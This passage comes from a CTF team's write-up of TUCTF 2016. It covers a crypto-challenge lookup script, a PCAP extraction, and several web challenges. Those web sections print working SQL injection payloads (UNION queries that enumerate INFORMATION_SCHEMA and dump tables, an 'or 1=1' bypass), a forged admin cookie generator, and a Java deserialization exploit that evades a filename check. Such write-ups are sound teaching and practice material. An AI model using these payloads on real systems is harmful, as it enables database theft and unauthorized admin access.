    "p.aecbi co eabi.prgpo" : "reading is dangerours",
    "ravf ghf ;pukcfrr"     : "save the princess",
    "oak. yd. lpcbj.oo"     : "save the princess",
    "ghf kyghukd"           : "the nothing",
    "yd. brydcbi"           : "the nothing",
    "ghf ypacif"            : "the oracle",
    "yd. rpajn."            : "the oracle",
    "ypf o,cmmcbi"          : "try swimming",
    "gpj rwummukd"          : "try swimming",
    "wficymf agpfjl"        : "welcome atreyu",
    ",.njrm. ayp.fg"        : "welcome atreyu"
    }
    
    # we found out, that in the previous challenges, we always had the
    # same words, so we built a table
    
    for i in xrange(50):
        print(sock.recv(256))
        # Round i. Give me some text:
        sock.send("the nothing\n")
        print("#######")
        answer=sock.recv(256)
        print("server answer:" +answer)
    
    match=re.search('What is (.*) decrypted?', answer)
    ciphertext=match.group(1)
    
    cleartext = CODEL3[ciphertext]
    
    print("Cleartext is:" + cleartext)
    sock.send(cleartext+"\n")
    
    print(sock.recv(256))
    
    # Round complete!
    # TUCTF{5omething_is_b3tt3r_th4n_n0thing}
    # ------------------------------------------
    # You have run into a bad place...
    # This is level 4, the swamps of sadness.
    # Round 1. Give me some text:

Level 4 was really damn weird. The encryptions were always totally different. And I had to wait half an eternity to run through all my script to get more cleartext-ciphertext pairs. I have no idea how the code there worked. And again if I succeeded I would only get 10 points. In comparison some web sql-injection challenge yielded at least 50 points. This was basically the reason I quit and tried some other challenges. So no code beyond level 3.

I have one log which is the transcript of the communication between my program and the server, which is perhaps interesting. It can be found [here](https://hkopp.github.io/assets/writeup-the-neverending-crypto-challenge/transcript.txt).

## Web - Student Grades

Student Grades was the first web challenge offering 50 points to earn exploiting a simple SQL injection. It has an input mask where you can type in a name. If it exists in the database it returns the name and grade of this person as response. The query is done through JavaScript. The code gives us everything we want to know:

{% highlight JavaScript %}
document.getElementById('submit').addEventListener('cli    ck',
    function(event){
        event.preventDefault();
        var input = document.getElementById('info');
        //var query = 'SELECT * from Names where name=\'' + input.value + '\'';
        var inp_str = input.value;
        inp_str = inp_str.replace(/\W+/g, " ");
        var md5_str = md5(inp_str);
        var send_str = inp_str+' '+md5_str;
        var post_data = {name: send_str, submit:1};
        $.ajax({
            type: "POST",
            url: "/postQuery.php",
            data: post_data,
            success: function(data){document.getElementById('results').innerHTML=data;}
        });
    }
);
{% endhighlight %}

The rookie hint in line 5 tells us how the SQL query is structured. Now we need to break out of it and query what we want, instead of what the website gives us. Reading the source a little further you'll see that all non-word characters are stripped out in line 7. The next line is more annoying since you see the input is hashed with MD5 digest and appended to the parameters. Burp Suite got Hashing-features built in into its Decoder recently but in this case it's a pain to copy&paste on every try. Hence I decided to automate this in a very early stage. The following script shows the final SQL query I used to get flag out of the "tuctf_info" table and how I got there:

    #!/usr/bin/env ruby
    require 'digest' 
    require 'net/http'
    # sqli = "xxx%' UNION ALL SELECT NULL,VERSION() UNION ALL SELECT * FROM tuctf_grades WHERE name LIKE '%xxx"
    # sqli = "xxx%' UNION ALL SELECT NULL,table_name FROM INFORMATION_SCHEMA.TABLES UNION ALL SELECT * FROM tuctf_grades WHERE name LIKE '%xxx"
    #sqli = "xxxx%' UNION ALL SELECT NULL,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='tuctf_info' UNION ALL SELECT * FROM tuctf_grades WHERE name LIKE '%xxxx"
    sqli = "xxx%' UNION ALL SELECT * FROM tuctf_info UNION ALL SELECT * FROM tuctf_grades WHERE name LIKE '%xxx"
    
    md5 = Digest::MD5.hexdigest(sqli)             # hash input
    payload = sqli.gsub(' ', '+') + "+" + md5     # and append it to the end 
    
    uri = URI("http://xxx.xxx.xxx.xxx/postQuery.php")
    body = { name: payload, submit: '1'} 
    Net::HTTP.start(uri.host, 80) do 'http'
        req = Net::HTTP::Post.new(uri)
        req['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:37.1) Gecko/20100101 Firefox/37.1'
        req['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        req['X-Requested-With'] = 'XMLHttpRequest'
        # Build the HTTP Post body here. Create body by hand since set_form_data(params)
        # encodes values.
        req.body = "name=#{payload}&submit=1" 
    
        resp = http.request(req)
        puts(resp.body.inspect)
    end

To get there I used the payload in line 4 which basically closes the first select statement, concatenates a new one which prompts the version of the database (a specific Ubuntu package name came up here). Then I append some garbage to close the SQLi in a valid manner. Looks ugly, is ugly, but does the job. After this step I knew it's a MySQL DBMS. So from now on I know which syntax to use to list all tables(line 5), their column names(line 6) and their content(line 7).

## Web - Duckprint

During the Duckprint challenge you could create a user, generate a so called duckprint and validate it. The latter only works if you have a valid admin-cookie (or deactivate JavaScript ;-). This is how the website looks like.

![duckprint]({{ site.baseurl }}/assets/2016-05-29-tuctf-2016-writeups/duckprint.png)

On the screenshot we see how the "Duckprint" ist created. Looking at the   HTML code we again see some hints about how the SQL query is constructed. This enables us to inject  SQL code easily. It looks like the query of the previous
web challenge. With the payload "\textit{uss' or 1=1 or username='}" we get all users of the database. The first entry is an admin user with the name "DuckDuckGoose" and her token (whatever the meaning of it might be) is "d4rkw1ng". So we are one step closer to the challenge. To get the actual token we need to create a valid duckprint for the admin. The website (see screenshot) allows us to do this for an arbitrary username except the admin. So we do this ourselves with the following code snippet.

    #!/usr/bin/env ruby
    require 'digest'
    require "base64"
    
    user = Base64.encode64('DuckDuckGoose').chomp
    keks = Base64.encode64('{"username":"DuckDuckGoose","admin":1}'.chomp)
    token = Base64.encode64('d4rkw1ng').chomp
    
    concated_stuff = "#{user}.#{keks}.#{token}"
    duck_print = Digest::SHA256.hexdigest(concated_stuff)
    puts(duck_print)
    
We can derive how to construct the cookie in line 6 by looking at the cookie which is set after registering in the web browser. Like already mentioned, to be able to input the duckprint on the "Validate" site you'll have to fake your own cookie inside the browser: script your request or just use a local attack proxy. Voila - 100 points.

## Web - LuckyCharms

The LuckCharms challenge started with a website showing an ordinary picture of a cornflakes package. A look at the source in Figure "Luckycharmsource" gives you an idea how to proceed.

![Luckycharms index page source]({{ site.baseurl }}/assets/2016-05-29-tuctf-2016-writeups/html_source.png)

So if we open that file (mentioned in HTML code) we see the Servlet which interprets our request. Both GET- and POST-methods are implemented though doGet() is just a wrapper for doPost(). After looking around a little bit we identified the interesting parts.

{% highlight Java %}
try {
    osfile = (OSFile) new ObjectInputStream(request.getInputStream()).readObject();
} catch(Exception e) {
    // Oops, let me help you out there
    osfile = new WindowsFile();
    if (request.getParameter("look") == null) {
        osfile.file = "charms.html";
    } else {
        osfile.file = request.getParameter("look");
    }
}
String f = osfile.getFileName().replace("/", "").replace("\\", "");
if(f.contains("flag")) {
    // bad hacker!
    out.println("You'll Never Get Me Lucky Charms!");
    return;
}
// later read file f with it's path lowercase
{% endhighlight %}

We have to circumvent the check which starts at line 13 - we need to open the file "flag" but can't pass it as URL parameter. So we have to manipulate the file object. I spared you the implementation of the OSFile class in the previous listing, but you can see it in our exploit following a little bit later. There are two subclasses of it: WindowsFile and UnixFile. The difference is the latter's file name is case sensitive.

Now let's look at how our request is interpreted. Line 2 shows how our request body is processed. It reads the request body as a Java object and deserializes it without any further checks - YOLO style. Since we don't provide any body at all the deserialization always throws an exception. There we can try to set our flag name. If we try something like "FlaG" it will be converted to lowercase in line 12 since it's a Windows file. So if we can convince the Servlet we have a UNIX file we can cheat the if clause in line 13. We could accomplish that by using some kind of camel case variations of the filename. Opening the file later would still work since at the very end a toLowerCase() is called explicitly.

To achieve our goal we need a) to let the deserialization succeed and b) pass a UnixFile with capital letters in the flag filename to trick the check _f.contains("flag")_. In the following code snipped you see our exploit.

{% highlight Java %}
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class Lucky {
    public static void main(String[] args) {
        OSFile f = new UnixFile();
        f.file = "FLAG";
        try{
            FileOutputStream fout = new FileOutputStream("uglyObj.ser");
            ObjectOutputStream oos = new ObjectOutputStream(fout);   
            oos.writeObject(f);
            oos.close();
        }catch(Exception ex){
        ex.printStackTrace();
        }
    }
}

abstract class OSFile implements Serializable {
    String file = "";
    abstract String getFileName();
}

class WindowsFile extends OSFile  {
    public String getFileName() {
        //Windows filenames are case-insensitive
        return file.toLowerCase();
    }
}

class UnixFile extends OSFile {
    public String getFileName() {
        //Unix filenames are case-sensitive, don't change
        return file;
    }
}
{% endhighlight %}

We create an OSFile object with the type UnixFile and write it to non-volatile memory. Afterwards we use BurpSuite to generate our request. It has a neat feature where you can basically right-click the request and load content from file. This is the request which got us the flag for 150 points.

![BurpSuite import file (serialized Java Object) into Request]({{ site.baseurl }}/assets/2016-05-29-tuctf-2016-writeups/burp_suite_serObj1.png)

## Misc - The Nack

This was a network analysis challenge. You had to download a PCAP file and find out what happens there (respectively find the flag). So what do you do getting your hands on a PCAP - you open it with Wireshark. The network trace consists of a lot of TCP packets which transport some data, at first glance this is binary data with some ASCII in between. A closer look at the first packets already reveal the transmitted file. Consider the first packet in the following screenshot.

![NACK Challenge, first packet]({{ site.baseurl }}/assets/2016-05-29-tuctf-2016-writeups/screen_first_packet.png)

You see the string "GOAT" and "GIF8". If you look at the second packet you'll find the rest of a Gif-header "9a". It stands to reason the network trace contains an image which we should extract. The TCP-packets contain no flow. This means it's not possible to extract the image using Wireshark (via Follow TCP-Stream). There are only TCP-SYNs containing the actual data. Looking through a few packets I could state that there was a static field with "GOAT\x01" and the second 4 bytes contained variable data. Obviously that was the transmitted Gif file. I wrote a quick and dirty script utilizing the [Scapy](http://www.secdev.org/projects/scapy/) framework.

    #!/usr/bin/env python3
    from scapy.all import *
    messages = rdpcap('ce6e1a612a1da91648306ace0cf7151e6531abc9.pcapng')
    file_content  = b''
    for message in messages:  
        try:
            if message[3].load[0:5] == b'GOAT\x01':
                file_content += message[3].load[5:]
            else:
                # either empty tcp or the one dropbox-sync packet, wtf, why?
                pass 
        except:
            # no Layer 4 (the two ARP)
            pass 
    with open('nack.gif', 'wb') as f:
        f.write(file_content)

It basically looks for all TCP packets whose payload starts with the static string "GOAT\x01". If the condition matches the last four bytes are extracted and written into a file at the end.
The extracted image contains a animated ROFL copter. Paying attention one can see a text flashing for a very short time period. Since it flashes very fast we use GIMP to look at the particular frame (with the flag).

![NACK ROFL copter opened in GIMP]({{ site.baseurl }}/assets/2016-05-29-tuctf-2016-writeups/rolf_copter-1024x302.png)

The writeup was a joint work of the Ulm Security Sparrows,
see you on the next CTF.

**Update:** Team ASCIIOVERFLOW has published a VM with all challenges (along with some organizational details): [http://ctf.asciioverflow.com/general/2016/07/06/tuctf-2016.html](http://ctf.asciioverflow.com/general/2016/07/06/tuctf-2016.html)
